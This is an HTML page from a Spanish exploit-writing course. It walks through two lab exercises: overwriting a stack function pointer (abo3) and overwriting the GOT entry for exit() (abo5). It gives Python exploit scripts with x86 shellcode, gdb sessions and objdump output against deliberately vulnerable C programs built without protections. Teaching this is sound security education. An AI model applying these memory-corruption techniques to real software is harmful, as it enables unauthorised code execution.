<!DOCTYPE html>
<html lang="en-us">

  <head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title>
    
       &middot; Guía de exploits
    
  </title>

  <!-- CSS -->

  <link rel="stylesheet" href="/guia-escritura-exploits/public/css/poole.css">
  <link rel="stylesheet" href="/guia-escritura-exploits/public/css/syntax.css">
  <link rel="stylesheet" href="/guia-escritura-exploits/public/css/hyde.css">
  <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">

  <!-- Icons -->
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/guia-escritura-exploits/public/apple-touch-icon-144-precomposed.png">
                                 <link rel="shortcut icon" href="/guia-escritura-exploits/public/favicon.ico">

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
</head>


  <body>

    <div class="sidebar">
 <!-- <div class="container sidebar-sticky">-->
  <div class="container sidebar">
    <div class="sidebar-about">
      <h1>
        <a href="/guia-escritura-exploits/">
          Guía de exploits
        </a>
      </h1>
      <!--<p class="lead"></p>-->
    </div>

    <nav class="sidebar-nav">

     <!-- <a class="sidebar-nav-item" href="/guia-escritura-exploits/">Home</a>-->

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/buffer-overflow/index.html">Buffer Overflow</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/1-introduccion.html">Nivel 1 | Teoría</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/1-practica.html">Nivel 1 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/2-shellcode.html">Nivel 2 | Shellcode</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/2-practica.html">Nivel 2 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/3-got.html">Nivel 3 | GOT</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/3-practica.html">Nivel 3 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/4-practica.html">Nivel 4 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/format-string/index.html">Format String</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/format-string/5-format-string.html">Nivel 5 | Format strings</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/format-string/5-practica.html">Nivel 5 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/esoteric/index.html">Esoteric</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/esoteric/6-ret2libc.html">Nivel 6 | Return to libc</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/esoteric/6-practica.html">Nivel 6 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/configuracion.html">Configuración</a>
        <a class="sidebar-nav-item" href="/guia-escritura-exploits/herramientas.html">Herramientas</a>


      <!--<a class="sidebar-nav-item" href="/archive/v2.1.0.zip">Descargar PDF</a>-->
      <a class="sidebar-nav-item" href="https://github.com/fundacion-sadosky/guia-escritura-exploits">Proyecto en GitHub</a>
    </nav>

    <p class="sidebar-nav-item footer">Basado en los <a href="https://github.com/gerasdf/InsecureProgramming/">abos de Gera</a></br> Teresa Alberto | STIC, Fundación Sadosky  </br> BY-NC-SA | 2018</p>
  </div>
</div>


    <div class="content container">
      <div class="page">
  <!--<h1 class="page-title"></h1>-->
  <h1 id="ataque-smash-the-stack-con-ejecución-indirecta">Ataque “Smash the stack” con ejecución indirecta</h1>

<h2 id="análisis-del-programa-vulnerable">Análisis del programa vulnerable</h2>
<h3 id="abo-3">Abo 3</h3>
<pre><code class="language-C">int main(int argv,char **argc) {

	extern system,puts;                           
	void (*fn)(char*)=(void(*)(char*))&amp;system;    /* fn: puntero almacenado en la pila */
	char buf[256];

	fn=(void(*)(char*))&amp;puts;
	strcpy(buf,argc[1]);
	fn(argc[2]);

	exit(1);                                      /* main() no retorna. Salida con error */
}
</code></pre>
<blockquote>
  <p><strong>Consideraciones</strong>:</p>
  <ul>
    <li>Función <code>exit(int estado)</code>: es una función de la biblioteca estándar de C (<code>stdlib.h</code>) que termina de forma controlada la ejecución de un programa.
      <blockquote>

      </blockquote>
    </li>
    <li>Nombres de argumentos <code>argc</code> y <code>argv</code>: en general <code>argc</code> es la cantidad de cadenas en la línea de comandos al llamar al programa, siendo <code>argc[0]</code> el nombre del programa. Y <code>argv</code> es un arreglo de punteros a los argumentos.    <br />
Hay que considerar que en los abos originales los nombres de <code>argc</code> y de <code>argv</code> están invertidos.</li>
  </ul>
</blockquote>

<h3 id="qué-hace-el-programa">¿Qué hace el programa?</h3>
<p>Se declaran las funciones <code>system</code> y <code>puts</code> que se definen de manera externa (pertenecen a <code>libc</code>). Luego se apila un puntero a <code>fn()</code> y después la variable local <code>buf</code>. 
Después se define la dirección de un puntero a <code>fn()</code>, se copia el contenido del primer parámetro dentro de <code>buf</code> y se ejecuta <code>fn()</code>. Por último se interrumpe la ejecución de <code>main()</code> sin retornar, y se sale del programa vulnerable con <code>exit(1)</code>.</p>

<h3 id="layout-de-la-pila-antes-del-exploit">Layout de la pila antes del exploit:</h3>
<p>Antes de modificar la dirección del puntero a <code>fn</code>, el mapa de la pila del programa es el siguiente:</p>
<pre><code class="language-C">      int main() {
        extern system,puts;                           
        void (*fn)(char*)=(void(*)(char*))&amp;system;
        char buf[256];
     
eip =&gt;  fn=(void(*)(char*))&amp;puts;
        strcpy(buf,argc[1]);
        fn(argc[2]);
     
        exit(1);
      }
</code></pre>
<p><img src="/guia-escritura-exploits/buffer-overflow/imagenes/abo3/layout-pila.png" alt="layout pila" /></p>

<h3 id="solución-anterior-sobreescribir-la-dirección-de-retorno-de-main">Solución anterior: sobreescribir la dirección de retorno de main()</h3>
<p>Como el programa finaliza con <code>exit(1)</code> es inútil sobreescribir la dirección de retorno de <code>main()</code> ya que esa función nunca va a retornar.</p>

<h3 id="cuál-es-la-dificultad-principal">¿Cuál es la dificultad principal?</h3>
<p>La función <code>exit()</code> modifica la salida del programa vulnerable con una llamada al sistema que finaliza el proceso. Por lo tanto de nada nos serviría sobreescribir la dirección de retorno de <code>main()</code> para ejecutar el shellcode.    <br />
Entonces: <strong>¿cómo logramos ejecutar el shellcode?</strong></p>

<h2 id="ataque-smash-the-stack-con-ejecución-indirecta-1">Ataque “Smash the stack” con ejecución indirecta</h2>
<p>Es posible aprovecharse de que el programa vulnerable ejecuta la función <code>fn()</code> y que además define un puntero a esa función que es almacenado en la pila.   <br />
Nuevamente es posible inyectar el shellcode en <code>buf</code> a través de la función <code>strcpy()</code>. Esta vez para ejecutarlo sobreescribimos el puntero a <code>fn()</code> para que apunte a nuestro shellcode. De esta manera, cuando se ejecute <code>fn()</code> logramos que lo que se ejecute sea nuestro código malicioso antes de que el proceso termine con <code>exit(1)</code>.</p>

<h3 id="layout-de-la-pila-deseado">Layout de la pila deseado:</h3>
<p><img src="/guia-escritura-exploits/buffer-overflow/imagenes/abo3/layout-pila-shell.png" alt="layout pila" /></p>

<ol>
  <li>
    <p>Aprovechamos el <code>strcpy(buf,argc[1])</code> para realizar un overflow: con el primer argumento <code>argc[1]</code> inyectamos el shellcode con un <a href="/guia-escritura-exploits/buffer-overflow/2-shellcode.html#tobogan-de-nops">tobogán de NOPs</a> y por desbordamiento sobreescribimos la dirección a la que apunta el puntero a <code>fn</code>:</p>

    <p><img src="/guia-escritura-exploits/buffer-overflow/imagenes/abo3/exploit.png" alt="input" /></p>
  </li>
  <li>
    <p>Armamos un archivo en Python para ingresar el input.</p>

    <p>Gracias al mapa de la pila sabemos que si con nuestro input llenamos <code>buf</code> los siguientes 4 bytes van a corresponder a la dirección del puntero a <code>fn()</code>. Como todavía no conocemos la dirección de <code>buf</code> probamos sobreescribir el puntero para que apunte a un valor cualquiera como <code>0x41414141</code>. Para ejecutar <code>fn()</code> se dereferencia la dirección del puntero de esa función, pero como <code>0x41414141</code> es una dirección por fuera del espacio de memoria del proceso se produce un <em>segmentation fault</em> o violación de segmento.    <br />
Aunque el objetivo aún no esté cumplido, con este paso intermedio nos aseguramos que podemos controlar el flujo de ejecución del programa.</p>

    <p>El shellcode usado es nuevamente el <a href="/guia-escritura-exploits/buffer-overflow/2-shellcode.html#shellcode-que-imprime-you-win">shellcode que imprime “You win!”</a>.</p>
    <pre><code class="language-python">#! /usr/bin/env python
"""Uso: ./abo3 "$(./exploit.py)" """
   
import sys
from struct import pack
   
#shellcode, imprime you win
shellcode  = "\xeb\x16\x31\xc0\x59\x88\x41\x08\xb0\x04\x31\xdb\x43"
shellcode += "\x31\xd2\xb2\x09\xcd\x80\xb0\x01\x4b\xcd\x80\xe8\xe5"
shellcode += "\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x41"
    
ret_addr = 0x41414141                                   #???? addr de buf
len_buf  = 256
   
exploit  = "\x90" * 80                                  #nops al principio de buf
exploit += shellcode                                    #shellcode
exploit += "\x42" * (len_buf-80-len(shellcode))         #completa buf
exploit += pack("&lt;I", ret_addr)                         #lleno *fn
   
sys.stdout.write(exploit)
</code></pre>
  </li>
  <li>Corremos el programa y verificamos que la ejecución salte a <code>0x41414141</code>.
    <pre><code class="language-bash">user@abos:~$ sudo sysctl -w kernel.randomize_va_space=0 #no random

user@abos:~$ gcc -m32 -fno-stack-protector -ggdb -mpreferred-stack-boundary=2 -z execstack -o abo3 abo3.c

user@abos:~$ env -i gdb ./abo3
GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
(gdb) break main
(gdb) run "$(./exploit.py)"
(gdb) c
Continuing.
   
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
</code></pre>
    <p>Perfecto. Al ejecutar <code>fn(argc[2])</code> como modificamos el puntero a <code>fn()</code> por la dirección <code>0x41414141</code> se intenta ejecutar una dirección no válida que resulta en una violación de segmento.</p>
  </li>
  <li>
    <p>Averiguamos la dirección de buf en la pila.   <br />
Nos aseguramos de <a href="/guia-escritura-exploits/configuracion.md#direcciones-en-la-pila-con-y-sin-modo-debugging">alinear las direcciones en el entorno de debugging y fuera de él</a>. Con <code>gdb</code> averiguamos la dirección de <code>buf</code> de la siguiente manera:</p>

    <p>Avanzamos con el operador de siguiente instrucción <code>si</code> en <code>gdb</code> hasta antes de la ejecución de la línea <code>fn=(void(*)(char*))&amp;puts</code>. En ese punto verificamos el valor de <code>buf</code>:</p>

    <pre><code class="language-bash">   (gdb) run "$(./exploit.py)"
   (gdb) si
   11    fn=(void(*)(char*))&amp;puts;
   (gdb) x/2i $eip                ; vemos las 2 instrucciones sgtes.
=&gt; 0x80484ab &lt;main+16&gt;: mov    DWORD PTR [ebp-0x4],0x8048350
   0x80484b2 &lt;main+23&gt;: mov    eax,DWORD PTR [ebp+0xc]
      
   (gdb) x/wx buf
   0xbffffbc4: 0x00000000
   (gdb) x/wx $ebp-0x104          ; es lo mismo
   0xbffffbc4: 0x00000000
</code></pre>
    <p>La dirección de <code>buf</code> es entonces <code>0xbffffbc4</code>.</p>

    <p>Un truco más fácil para obtener esa información es agregar en el código fuente de <code>abo3.c</code> una línea que imprima la dirección de <code>buf</code> como por ejemplo: <code>printf("buf: %08x\n", &amp;buf)</code>. Después compilar nuevamente y ejecutar el programa vulnerable para conocer la dirección de <code>buf</code>. Evidentemente en casos reales no podremos modificar el código fuente del programa que queremos explotar.</p>
  </li>
  <li>
    <p>Actualizamos el script con la dirección de buf.   <br />
Para poder contar con mayor margen de error no saltamos exactamente al comienzo de <code>buf</code> sino en la mitad del tobogán de nops. Para eso le sumamos a esa dirección 40 bytes, considerando que el <em>nop sled</em> es de 80 bytes.</p>

    <pre><code class="language-python">#! /usr/bin/env python
"""Uso: ./abo3 "$(./exploit.py)" """
   
import sys
from struct import pack
   
#shellcode, imprime you win
shellcode  = "\xeb\x16\x31\xc0\x59\x88\x41\x08\xb0\x04\x31\xdb\x43"
shellcode += "\x31\xd2\xb2\x09\xcd\x80\xb0\x01\x4b\xcd\x80\xe8\xe5"
shellcode += "\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x41"
    
buf_addr = 0xbffffbc4                                   #addr de buf
ret_addr = buf_addr+40                                  #addr tobogan nops
len_buf  = 256
   
exploit  = "\x90" * 80                                  #nops al principio de buf
exploit += shellcode                                    #shellcode
exploit += "\x90" * (len_buf-80-len(shellcode))         #nops que completan buf
exploit += pack("&lt;I", ret_addr)                         #lleno fn()
   
sys.stdout.write(exploit)
</code></pre>
  </li>
  <li>Ejecutamos el exploit y logramos imprimir el mensaje ganador.
    <pre><code class="language-bash">user@abos:~$ env -i LINES=34 COLUMNS=72 PWD=$(pwd) /home/usuarix/abos/abo3 "$(./exploit.py)"
you win!
</code></pre>
  </li>
</ol>

<blockquote>
  <p><strong>Consideraciones</strong>: si las variables de entorno se incluyen o no en la ejecución dependerá del método de alineación del stack elegido.</p>
</blockquote>

<p>Gráficamente logramos el siguiente resultado:</p>

<p><img src="/guia-escritura-exploits/buffer-overflow/imagenes/abo3/programa-explotado.png" alt="pila después" /></p>

<p>…………………………………………………………………………………………………………………………………………………</p>

<h1 id="ataque-de-reescritura-de-la-global-offset-table-got">Ataque de reescritura de la Global Offset Table (GOT)</h1>

<h2 id="análisis-del-programa-vulnerable-1">Análisis del programa vulnerable</h2>
<h3 id="abo-5">Abo 5</h3>
<pre><code class="language-C">int main(int argv,char **argc) {
        char *pbuf=malloc(strlen(argc[2])+1);
        char buf[256];

        strcpy(buf,argc[1]);
        for (;*pbuf++=*(argc[2]++););
        exit(1);
	}
</code></pre>

<h3 id="qué-hace-el-programa-1">¿Qué hace el programa?</h3>
<p>El programa vulnerable apila dos variables locales: el arreglo <code>buf</code> y el puntero <code>pbuf</code> (que apunta al heap). Después de copiar el contenido del primer y segundo parámetro en las variables, ejecuta la función <code>exit()</code> que hará una syscall <code>exit</code> (con un estatus de 1 de error) y finalizará el proceso provocando que <code>main()</code> nunca retorne.</p>

<h3 id="layout-de-la-pila-antes-del-exploit-1">Layout de la pila antes del exploit:</h3>

<p><img src="/guia-escritura-exploits/buffer-overflow/imagenes/abo5/layout-pila.png" alt="layout pila" /></p>

<h3 id="cuál-es-la-dificultad-principal-1">¿Cuál es la dificultad principal?</h3>
<p>Nuevamente finaliza el proceso de manera anticipada con el llamado a <code>exit()</code>, sin un retorno a <code>main()</code>.    <br />
Además, no se ejecuta una función auxiliar en el programa vulnerable (como antes <code>fn()</code>), lo que complica la ejecución del código inyectado.   <br />
<strong>¿Cómo logramos ejecutar el shellcode de manera indirecta aprovechando el puntero pbuf adicional?</strong></p>

<h2 id="ataque-de-reescritura-de-la-global-offset-table-got-1">Ataque de reescritura de la Global Offset Table (GOT)</h2>
<p>Hasta este momento se han realizado ataques en el nivel de la pila, es decir, aprovechando direcciones de retorno y punteros a funciones almacenados en ese área de la memoria.   <br />
En numerosos casos, no es de utilidad sobreescribir la dirección de retorno debido a mitigaciones en la pila o a funciones como <code>exit()</code> que finalizan un proceso sin utilizar la dirección de retorno de la pila. En estos casos se deben encontrar otras maneras de tomar el control del proceso explotado.</p>

<p>Si imaginamos un escenario real dónde un mismo binario se comparte (a través de por ejemplo repositorios de GNU/Linux), es posible idear un ataque a nivel del binario con la reescritura de la <a href="/guia-escritura-exploits/buffer-overflow/3-got.html#global-offset-table-got">tabla GOT</a>. La dirección de una entrada en la GOT está definida para cada binario, de modo que es independiente de la pila y sus variables de entorno.   <br />
El aprovechamiento de la GOT es un recurso valioso por esa y otras razones que se especifican en el apartado sobre la <a href="/guia-escritura-exploits/buffer-overflow/3-got.html#la-utilidad-de-la-got">utilidad de la GOT</a>.</p>

<p>Justamente en este ejemplo puntual es posible manipular la dirección a la que apunta <code>exit()</code> en la tabla GOT para que apunte al código inyectado, y el programa vulnerable en vez de ejecutar la función de la biblioteca compartida ejecute el shellcode.    <br />
Como la tabla GOT está fuera de la pila no es posible sobreescribir la dirección de <code>exit()</code> con el overflow de una variable local sino que hay que acceder a otras secciones de la memoria por fuera de la pila. Aquí entra en juego el puntero <code>pbuf</code>.</p>

<p>Logramos el ataque de manera indirecta:</p>
<ol>
  <li><code>strcpy(buf,argc[1])</code> con el primer parámetro inyectamos el shellcode y sobreescribirmos <code>pbuf</code> para que apunte a la entrada de <code>exit</code> en la GOT (por fuera de la pila).</li>
  <li><code>for (;*pbuf++=*(argc[2]++);)</code> dado que el segundo parámetro modifica el valor a dónde referencia <code>pbuf</code>, con él podemos cambiar la dirección de <code>exit</code> en la GOT por la dirección de nuestro shellcode.</li>
</ol>

<h3 id="layout-de-la-pila-deseado-1">Layout de la pila deseado:</h3>

<p><img src="/guia-escritura-exploits/buffer-overflow/imagenes/abo5/layout-pila-shell.png" alt="layout pila" /></p>

<ol>
  <li>
    <p>Desensamblamos para ver la dirección de <code>exit</code> en la GOT.  <br />
En este punto para no marearse con referencias cruzadas y saber exactamente dónde encontrar el dato necesario, es importante tener en mente el proceso de <a href="/guia-escritura-exploits/buffer-overflow/3-got.html#enlazado-din%C3%A1mico-de-librerias-a-binarios">enlazado dinámico de bibliotecas</a>.</p>

    <p>La manera más simple de encontrar el listado de entradas de la GOT es usando el flag <code>[-R|--dynamic-reloc]</code> de <code>objdump</code>:</p>

    <pre><code class="language-asm">user@abos:~$ gcc -m32 -fno-stack-protector -ggdb -mpreferred-stack-boundary=2 -z execstack -o abo5 abo5.c
user@abos:~$ objdump -R abo5
abo5:     file format elf32-i386
   
DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
080497a8 R_386_GLOB_DAT    __gmon_start__
080497b8 R_386_JUMP_SLOT   printf
080497bc R_386_JUMP_SLOT   strcpy
080497c0 R_386_JUMP_SLOT   malloc
080497c4 R_386_JUMP_SLOT   __gmon_start__
080497c8 R_386_JUMP_SLOT   exit             ; entrada de la GOT para exit
080497cc R_386_JUMP_SLOT   strlen
080497d0 R_386_JUMP_SLOT   __libc_start_main
   
</code></pre>

    <p>En la primer columna se indican las direcciones de cada entrada de la GOT, entonces la dirección que buscamos es: <code>0x080497c8</code>.</p>

    <p>Otra forma de encontrar la dirección de <code>exit</code> en la GOT es -primero- buscar la llamada a <code>exit</code> en <code>main()</code>:</p>
    <pre><code class="language-asm">user@abos:~$ objdump -d -M intel abo5 

Disassembly of section .text:
(...)
8048536:    e8 55 fe ff ff           call   8048390 &lt;exit@plt&gt;
(...)
</code></pre>

    <p>Y segundo buscamos en la sección <code>.plt</code> la dirección <code>0x8048390</code> del <code>call</code>, donde encontramos definida <code>exit@plt</code>:</p>
    <pre><code class="language-asm">   user@abos:~$ objdump -d -M intel abo5 

   Disassembly of section .plt:
   08048390 &lt;exit@plt&gt;:
   8048390:    ff 25 c8 97 04 08        jmp    *0x80497c8
   8048396:    68 20 00 00 00           push   $0x20
   804839b:    e9 a0 ff ff ff           jmp    8048340 &lt;_init+0x2c&gt;
</code></pre>

    <p>En la primer línea vemos el salto a <code>0x80497c8</code>. Tomando en cuenta el proceso de <a href="/guia-escritura-exploits/buffer-overflow/3-got.html#enlazado-din%C3%A1mico-de-librerias-a-binarios">enlazado dinámico de bibliotecas</a>, sabemos que es esa la dirección de <code>exit</code> dentro de la tabla GOT que queremos modificar para que apunte a nuestro shellcode.</p>

    <p>Es posible ara ver las secciones del ejecutable y corroborar que esa dirección pertenece a la sección <code>.got</code> (o a la sección <code>.got.plt</code> más específicamente):</p>

    <pre><code class="language-bash">   user@abos:~$ readelf -S abo5
   There are 35 section headers, starting at offset 0x1404:
      
   	Section Headers:
   	  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
   	  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
   		(...)
   	  [12] .plt              PROGBITS        08048340 000340 000080 04  AX  0   0 16
   	  [13] .text             PROGBITS        080483c0 0003c0 0001f2 00  AX  0   0 16
   		(...)
   	  [22] .got              PROGBITS        080497a8 0007a8 000004 04  WA  0   0  4
   	  [23] .got.plt          PROGBITS        080497ac 0007ac 000028 04  WA  0   0  4
   	  [24] .data             PROGBITS        080497d4 0007d4 000008 00  WA  0   0  4
</code></pre>

    <p>Efectivamente la dirección <code>08048390 &lt;exit@plt&gt;</code> pertenece a la sección .plt que empieza en <code>0x08048340</code> y tiene un tamaño de 80 bytes.</p>

    <p>Y, en cambio, la dirección <code>0x080497c8 &lt;exit@got&gt;</code> pertenece a la sección .got.plt que empieza en <code>080497ac</code>y tiene un tamaño de 28.</p>
  </li>
  <li>
    <p>Usamos un único overflow (con <code>argv[1]</code>) para inyectar el shellcode y sobreescribir la dirección a la que apunta el puntero <code>pbuf</code>. Y con el segundo argumento de <code>main()</code> (con <code>argv[2]</code>) modificamos la dirección en la entrada <code>exit</code> en la GOT:</p>

    <p><img src="/guia-escritura-exploits/buffer-overflow/imagenes/abo5/exploit.png" alt="input" /></p>
  </li>
  <li>Armamos un archivo en Python para ingresar como primer parámetro el tobogán de nops, nuestro shellcode y la dirección dentro de la GOT a la que va a apuntar <code>pbuf</code>. Armamos con eso <code>param1.py</code>.
    <pre><code class="language-python">#! /usr/bin/env python
   
"""Uso: ./abo5 "$(./param1.py)" "$(./param2.py)" """
   
import sys
from struct import pack
   
#shellcode, imprime you win
shellcode  = "\xeb\x16\x31\xc0\x59\x88\x41\x08\xb0\x04\x31\xdb\x43"
shellcode += "\x31\xd2\xb2\x09\xcd\x80\xb0\x01\x4b\xcd\x80\xe8\xe5"
shellcode += "\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x41"
   
exit_addr  = 0x080497c8                         #addr exit en GOT
len_buf  = 256

exploit  = "\x90" * 80                          #nops al principio de buf
exploit += shellcode                            #shellcode
exploit += "\x90" * (len_buf-80-len(shellcode)) #nops que completan buf
exploit += pack("&lt;I", exit_addr)                #defino pbuf
   
sys.stdout.write(exploit)
</code></pre>
  </li>
  <li>Armamos un archivo en Python para ingresar como segundo parámetro. El objetivo es escribir en la GOT una dirección en el medio del tobogán de nops, no obstante probamos primero con una dirección cualquiera para verificar los cálculos. Armamos <code>param2.py</code>.
    <pre><code class="language-python">#! /usr/bin/env python
"""Uso: ./abo5 "$(./param1.py)" "$(./param2.py)" """
   
import sys
from struct import pack
   	 
buf_addr = 0x41414141                           #???? addr de buf
   
exploit = pack("&lt;I", buf_addr)                  #sobreescribo exit en la GOT
   
sys.stdout.write(exploit)
</code></pre>
    <p>Y probamos ejecutar el abo con ambos parámetros:</p>
    <pre><code class="language-bash">user@abos:~$ gdb ./abo5
GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
(gdb) run "$(./param1.py)" "$(./param2.py)"

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
</code></pre>
    <p>Logramos que <code>eip</code> intente ejecutar instrucciones de la dirección <code>0x41414141</code>. Ahora basta reemplazarla por una dirección en el medio del tobogán de nops.</p>
  </li>
  <li>Averiguamos la dirección de buf en la pila.
    <pre><code class="language-bash">user@abos:~$ gdb ./abo5
GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
(gdb) break main
(gdb) break 13                              ; break en strcpy(buf..)
(gdb) run "$(./param1.py)" "$(./param2.py)"

(gdb) x/wx buf
0xbffff490:  0x00000000
</code></pre>
    <p>La dirección de <code>buf</code> es entonces <code>0xbffff490</code>. Editamos el script <code>param2.py</code> con la dirección de <code>buf</code> más 40 bytes extras para darnos margen y aterrizar en el tobogán de nops:</p>
    <pre><code class="language-python">#! /usr/bin/env python
"""Uso: ./abo5 "$(./param1.py)" "$(./param2.py)" """
   
import sys
from struct import pack
       
buf_addr = 0xbffff490+40                     #addr tobogan nops en buf

exploit = pack("&lt;I", buf_addr)               #sobreescribo exit en la GOT
   
sys.stdout.write(exploit)
</code></pre>
  </li>
  <li>Ejecutamos el exploit en su versión final
    <pre><code class="language-bash">user@abos:~$ ./abo5 "$(./param1.py)" "$(./param2.py)"
you win!
</code></pre>
  </li>
</ol>

<h3 id="cómo-seguir">¿Cómo seguir?</h3>
<ol>
  <li><strong>Abo 4</strong>: el programa vulnerable finaliza en un loop infinito (<code>while(1)</code>), por lo que es factible llevar a cabo una estrategia similar.
    <pre><code class="language-C">extern system,puts; 
void (*fn)(char*)=(void(*)(char*))&amp;system;
   
int main(int argv,char **argc) {
	char *pbuf=malloc(strlen(argc[2])+1);
	char buf[256];

	fn=(void(*)(char*))&amp;puts;
	strcpy(buf,argc[1]);		
	strcpy(pbuf,argc[2]);
	fn(argc[3]);
   	
   while(1);
}
</code></pre>
  </li>
</ol>


</div>

    </div>

  </body>
</html>
